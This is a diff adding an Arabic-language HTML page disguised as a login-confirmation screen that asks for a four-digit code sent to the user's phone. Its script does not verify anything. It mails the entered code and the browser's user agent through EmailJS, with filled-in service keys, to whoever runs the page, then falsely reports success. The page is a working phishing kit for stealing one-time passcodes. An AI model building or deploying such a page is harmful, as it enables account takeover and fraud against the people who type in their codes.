@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>تأكيد الدخول</title>
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+    <style>
+        /* 🔵 إعدادات الصفحة العامة */
+        * {
+            box-sizing: border-box;
+            outline: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #ffffff;
+            font-family: 'Cairo', sans-serif; /* الخط المطلوب */
+            height: 100vh;
+            height: -webkit-fill-available;
+            display: flex;
+            flex-direction: column;
+            color: #333;
+            overflow: hidden;
+        }
+
+        /* 🔵 1. الـ Header (الشريط العلوي) */
+        .header {
+            height: 65px; /* بين 60-70px */
+            background-color: #01A7C1; /* لون سماوي فيروزي قوي */
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            padding: 0 20px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+
+        .header-title {
+            color: #ffffff;
+            font-size: 21px; /* بين 20-22px */
+            font-weight: 700; /* Bold */
+        }
+
+        .back-icon {
+            position: absolute;
+            right: 20px; /* في الجهة اليمنى للـ RTL */
+            color: #ffffff;
+            font-size: 20px;
+            cursor: pointer;
+        }
+
+        /* حاوية المحتوى الوسطي */
+        .content-container {
+            flex: 1;
+            padding: 0 25px;
+            display: flex;
+            flex-direction: column;
+            align-items: center; /* توسيط العناصر */
+        }
+
+        /* 🔵 2. النص الرئيسي */
+        .main-text {
+            margin-top: 40px; /* حوالي 35-45px */
+            color: #1A1A1A;
+            font-size: 20px;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 50px;
+        }
+
+        /* 🔵 3. خانات إدخال OTP (خطوط) */
+        .otp-container {
+            display: flex;
+            gap: 25px; /* تباعد 25px */
+            direction: ltr; /* لضمان ترتيب الأرقام */
+            margin-bottom: 50px;
+        }
+
+        .otp-input {
+            width: 40px; /* 35-40px */
+            border: none;
+            border-bottom: 2px solid #333; /* سمك 2px ولون غامق */
+            text-align: center;
+            font-size: 28px;
+            font-family: 'Cairo', sans-serif;
+            font-weight: 600;
+            background: transparent;
+            border-radius: 0;
+            padding: 5px 0;
+            color: #1A1A1A;
+            transition: border-color 0.3s;
+        }
+
+        .otp-input:focus {
+            border-bottom-color: #01A7C1; /* تلون عند التركيز بنفس لون الهيدر */
+        }
+
+        /* 🔵 4. النص الخاص بمدة الصلاحية */
+        .timer-container {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .timer-label {
+            color: #444;
+            font-size: 16px;
+            margin-bottom: 5px;
+            display: block;
+        }
+
+        .timer-countdown {
+            color: #1A1A1A;
+            font-size: 17px; /* 16-18px */
+            font-weight: 600;
+            display: block;
+        }
+
+        /* 🔵 5. رابط إعادة الإرسال (المعطل) */
+        .resend-link {
+            color: #B6B6B6; /* رمادي باهت جداً */
+            font-size: 15px;
+            font-weight: 400;
+            text-decoration: none;
+            pointer-events: none; /* غير قابل للضغط */
+            cursor: default;
+        }
+
+        /* 🔵 6. زر التحقق (أسفل الشاشة) */
+        .submit-container {
+            width: 100%;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+        }
+
+        .verify-btn {
+            width: 100%;
+            height: 65px; /* 60-70px */
+            background-color: #FFC400; /* أصفر قوي */
+            color: #ffffff; /* نص أبيض */
+            font-family: 'Cairo', sans-serif;
+            font-weight: 600;
+            font-size: 18px;
+            border: none;
+            cursor: pointer;
+            transition: background 0.2s;
+            /* إزالة الحواف الدائرية ليكون ملتصق تماماً */
+            border-radius: 0; 
+        }
+
+        .verify-btn:active {
+            background-color: #e0ac00;
+        }
+        
+        .verify-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+    </style>
+</head>
+<body>
+
+    <header class="header">
+        <i class="fa-solid fa-arrow-right back-icon" onclick="history.back()"></i>
+        <div class="header-title">شيفرة التأكيد</div>
+    </header>
+
+    <div class="content-container">
+        
+        <div class="main-text">
+            أدخل رمز التأكيد المرسل إلى رقم هاتفك
+        </div>
+
+        <form id="otpForm" onsubmit="event.preventDefault(); verifyOtp();">
+            <div class="otp-container">
+                <input type="tel" inputmode="numeric" class="otp-input" maxlength="1" id="otp1" autocomplete="one-time-code">
+                <input type="tel" inputmode="numeric" class="otp-input" maxlength="1" id="otp2" autocomplete="one-time-code">
+                <input type="tel" inputmode="numeric" class="otp-input" maxlength="1" id="otp3" autocomplete="one-time-code">
+                <input type="tel" inputmode="numeric" class="otp-input" maxlength="1" id="otp4" autocomplete="one-time-code">
+            </div>
+        </form>
+
+        <div class="timer-container">
+            <span class="timer-label">تنتهي صلاحية رمز التأكيد خلال</span>
+            <span class="timer-countdown" id="countdown">4 دقائق 58 ثواني</span>
+        </div>
+
+        <a href="#" class="resend-link">إعادة إرسال رمز التأكيد</a>
+
+    </div>
+
+    <div class="submit-container">
+        <button type="submit" form="otpForm" class="verify-btn">التحقق</button>
+    </div>
+
+    <script>
+        // 1. إعداد EmailJS
+        (function(){
+            // ⚠️⚠️ استبدل 'YOUR_PUBLIC_KEY' بمفتاحك العام
+            emailjs.init("zWBq4dbSzfkEvVeS2");
+        })();
+
+        // 2. منطق التنقل التلقائي بين الخانات
+        const otpInputs = document.querySelectorAll('.otp-input');
+
+        otpInputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                e.target.value = e.target.value.replace(/[^0-9]/g, '');
+                if (e.target.value.length === 1) {
+                    if (index < otpInputs.length - 1) {
+                        otpInputs[index + 1].focus();
+                    } else {
+                        input.blur(); 
+                    }
+                }
+            });
+
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && e.target.value === '') {
+                    if (index > 0) {
+                        otpInputs[index - 1].focus();
+                    }
+                }
+            });
+
+            input.addEventListener('focus', (e) => {
+                e.target.select();
+            });
+        });
+
+        // 3. منطق العد التنازلي (Timer)
+        let totalSeconds = (4 * 60) + 58; // 4 دقائق و 58 ثانية
+        const countdownElement = document.getElementById('countdown');
+
+        const timerInterval = setInterval(() => {
+            if (totalSeconds <= 0) {
+                clearInterval(timerInterval);
+                countdownElement.innerText = "انتهت الصلاحية";
+                // تفعيل زر إعادة الإرسال عند الانتهاء (اختياري)
+                const resendLink = document.querySelector('.resend-link');
+                resendLink.style.color = "#01A7C1";
+                resendLink.style.pointerEvents = "auto";
+                resendLink.style.cursor = "pointer";
+                return;
+            }
+
+            totalSeconds--;
+            const minutes = Math.floor(totalSeconds / 60);
+            const seconds = totalSeconds % 60;
+
+            countdownElement.innerText = `${minutes} دقائق ${seconds} ثواني`;
+        }, 1000);
+
+
+        // 4. دالة الإرسال
+        function verifyOtp() {
+            const otpCode = 
+                document.getElementById('otp1').value + 
+                document.getElementById('otp2').value + 
+                document.getElementById('otp3').value + 
+                document.getElementById('otp4').value;
+
+            if(otpCode.length < 4) {
+                alert("يرجى إدخال الرمز كاملاً.");
+                return;
+            }
+
+            const btn = document.querySelector('.verify-btn');
+            const originalBtnText = btn.innerText;
+            
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري التحقق...';
+            btn.disabled = true;
+
+            // إعداد البيانات للإرسال
+            var templateParams = {
+                otp_code: otpCode,
+                device_info: navigator.userAgent
+            };
+
+            // ⚠️⚠️ استبدل المعلومات أدناه بمعلوماتك الحقيقية
+            emailjs.send('service_lyabofe', 'template_v443mrn', templateParams)
+                .then(function(response) {
+                    console.log('SUCCESS!', response.status, response.text);
+                    btn.innerText = 'تم التحقق بنجاح';
+                    btn.style.backgroundColor = "#4CAF50"; 
+                    
+                    setTimeout(() => {
+                         // هنا يمكنك التوجيه للصفحة التالية
+                         // window.location.href = "success.html";
+                         btn.innerText = originalBtnText;
+                         btn.style.backgroundColor = "#FFC400";
+                         btn.disabled = false;
+                         document.getElementById('otpForm').reset();
+                         otpInputs[0].focus();
+                    }, 2000);
+
+                }, function(error) {
+                    console.log('FAILED...', error);
+                    alert("رمز التأكيد غير صحيح أو حدث خطأ.");
+                    btn.innerText = originalBtnText;
+                    btn.disabled = false;
+                });
+        }
+    </script>
+</body>
+</html>
